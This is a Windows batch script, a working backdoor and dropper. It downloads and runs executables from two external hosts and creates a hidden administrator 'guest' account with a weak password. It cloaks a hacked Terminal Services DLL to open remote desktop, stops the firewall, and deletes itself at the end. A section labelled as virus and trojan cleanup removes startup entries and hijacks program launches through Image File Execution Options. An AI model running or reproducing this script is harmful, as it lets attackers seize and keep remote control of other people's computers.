@echo off

ver | find "5.1." >nul && goto XP

goto 2k

:XP
@wget http://www.onlinek.net/ad/log/135/135.exe
@ping -n 3 127.0.1
@start 135.exe

@aio -terminal 7788
@net1 user guest 123 /add
@net1 uesr guest 123
@net1 localgroup administrators guest /add
@net1 user guest /active:yes
@aio -clone administrator guest 123
Tasklist/SVC >>1.txt
type 1.txt | find "DcomLaunch" >2.txt
for /f "eol= tokens=1,2 delims= " %%i in (2.txt) do ntsd -c q -p %%j
REG ADD HKLM\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion\Winlogon /v KeepRASConnections /t REG_SZ /d 1 /f
@REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
@REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Licensing" "Core /v EnableConcurrentSessions /t REG_DWORD /d 00000001 /f
@REG ADD HKLM\SYSTEM\CurrentControlSet\Services\TermService\Parameters /v ServiceDll /t REG_EXPAND_SZ /d %SystemRoot%\System32\termsrvhack.dll /f
@copy termsrvhack.dll %SystemRoot%\System32\termsrvhack.dll
@Attrib +H +S +R %SystemRoot%\System32\termsrvhack.dll
@shutdown -a
@shutdown -a
@shutdown -a
@del termsrvhack.dll
@del 1.txt
@del 2.txt
@net stop sharedaccess
@net start dcomlaunch
@net start termservice

echo ok > c:\7788.ini

:Clear
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@echo::防御流行病毒
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@echo Windows Registry Editor Version 5.00>> 1.reg
@echo [-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>> 1.reg 
@echo [-HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>> 1.reg
@echo [-HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\]>> 1.reg
@regedit /s 1.reg
@del 1.reg

@for /f "eol= tokens=1 delims= " %%i in (exe.txt) do (
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%%i" /v debugger /t reg_sz /d debugfile.exe /f
)

@ATTRIB -R -H -S -A "C:\Documents and Settings\All Users\「开始」菜单\程序\启动\*.*"
@DEL /F /Q /A -R -H -S -A "C:\Documents and Settings\All Users\「开始」菜单\程序\启动\*.*"
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@echo::删除蠕虫病毒,请稍侯
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
tskill sedrsvedt.exe 
tskill racvsvc.exe
tskill sach0st.exe
tskill upxdnd.exe
tskill igw.exe 
tskill igm.exe 
tskill cmdbcs.exe
tskill dbghlp32.exe
tskill nvdispdrv.exe
tskill rundl133.exe
tskill rundll32.exe
tskill logo_1.exe
tskill logo1_.exe
tskill hh.exe
tskill aa.exe
tskill 1.exe 
tskill 2.exe 
tskill 3.exe 
tskill 4.exe
tskill 5.exe 
tskill 6.exe 
tskill 7.exe
tskill 8.exe
tskill 9.exe 
tskill spoclsv.exe 
tskill SVCH0ST.exe 
tskill svohost.exe 
tskill sxs.exe

del %windir%\sedrsvedt.exe
del %windir%\racvsvc.exe
del %windir%\drivers\sach0st.exe
del %windir%\upxdnd.exe
del %windir%\igw.exe
del %windir%\igm.exe
del %windir%\cmdbcs.exe
del %windir%\dbghlp32.exe
del %windir%\nvdispdrv.exe
del %windir%\kvdxsbma.dll
del %windir%\rsjzbpm.dll
del %windir%\kvdxcma.dll
del %windir%\ratbfpi.dll
del %windir%\avwlbmn.dll
del %windir%\kaqhezy.dll
del %windir%\kapjbzy.dll
del %windir%\sidjazy.dll
del %windir%\avwgcmn.dll
del %windir%\raqjbpi.dll
del %windir%\avzxdmn.dll
del %windir%\kawdbzy.dll
del %windir%\rsztcpm.dll
del %windir%\rsmydpm.dll
del %Windir%\MickNew\MickNew.dll
del %Windir%\MH_FILE\MH_DLL.dll 
del %Windir%\TODAYZTKING\TODAYZTKING.DLL
del %windir%\system\Logo1_.exe
del %windir%\rundl132.exe
del %windir%\vDll.dll
del %windir%\Dll.dll
del %windir%\1.exe
del %windir%\2.exe
del %windir%\3.exe
del %windir%\4.exe
del %windir%\5.exe
del %windir%\6.exe
del %windir%\7.exe
del %windir%\8.exe
del %windir%\9.exe
del %windir%\SVCH0ST.exe
del %windir%\logo_1.exe
del %windir%\svohost.exe
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@echo::清除灰鸽子和上兴等木马程序，请稍侯....... 
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@aio -EnumService Stopped > info.txt
@for /f "eol= tokens=1 delims= " %%i in (mdb.txt) do find /i "%%i" info.txt >>muma.txt
@for /f "eol=- tokens=4 delims= " %%i in (muma.txt) do sc config %%i start= disabled
@for /f "eol=- tokens=4 delims= " %%i in (muma.txt) do sc delete %%i
@for /f "eol=- tokens=4 delims= " %%i in (muma.txt) do sc config %%i start= disabled
@for /f "eol=- tokens=4 delims= " %%i in (muma.txt) do sc delete %%i
@del info.txt
@del muma.txt
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@echo::恢复注册表中不给设置显示隐藏文件的项目,请稍侯
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo Windows Registry Editor Version 5.00> delshare.reg 
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL]>> delshare.reg 
echo "RegPath"="Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced">> delshare.reg 
echo "Text"="@shell32.dll,-30500">> delshare.reg 
echo "Type"="radio">> delshare.reg 
echo "CheckedValue"=dword:00000001>> delshare.reg 
echo "ValueName"="Hidden">> delshare.reg 
echo "DefaultValue"=dword:00000002>> delshare.reg 
echo "HKeyRoot"=dword:80000001>> delshare.reg 
echo "HelpID"="shell.hlp#51105">> delshare.reg 
regedit /s delshare.reg 
del delshare.reg 
echo Windows Registry Editor Version 5.00> cc.reg 
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows]>> cc.reg 
echo "DebugOptions"="2048">> cc.reg 
echo "Documents"="">> cc.reg 
echo "DosPrint"="no">> cc.reg 
echo "load"=->> cc.reg 
echo "NetMessage"="no">> cc.reg 
echo "NullPort"="None">> cc.reg 
echo "programs"="com exe bat pif cmd">> cc.reg 
echo "Device"="">> cc.reg 
regedit /s cc.reg 
del cc.reg 
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@echo::删除每个分区下的SXS.EXE和AUTORUN.INF文件，请稍侯....... 
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
FOR %%a IN ( C: D: E: F: G: H: ) DO ATTRIB -R -H -S -A %%a\SXS.EXE & DEL /F /Q /A -R -H -S -A %%a\SXS.EXE & ATTRIB -R -H -S -A %%a\setup.exe & DEL /F /Q /A -R -H -S -A %%a\setup.exe & ATTRIB -R -H -S -A %%a\system.exe & DEL /F /Q /A -R -H -S -A %%a\system.exe & ATTRIB -R -H -S -A %%a\rose.exe & DEL /F /Q /A -R -H -S -A %%a\rose.exe & ATTRIB -R -H -S -A %%a\AUTORUN.INF & DEL /F /Q /A -R -H -S -A %%a\AUTORUN.INF

@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@echo::关闭有害端口，请稍侯....... 
@echo::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
net share c$ /del 
net share d$ /del 
net share e$ /del 
net share f$ /del 
net share admin$ /del 
net share ipc$ /del
@del 1.vbs
@del c:\boot.exe
@del c:\ghost.exe
@del 7788.exe
del exe.txt
del mdb.txt
del %0
@exit

:2K
@wget  http://vip.u-uuu.cn/baidu1.exe
@ping -n 3 127.0.1
@start baidu1.exe
goto Clear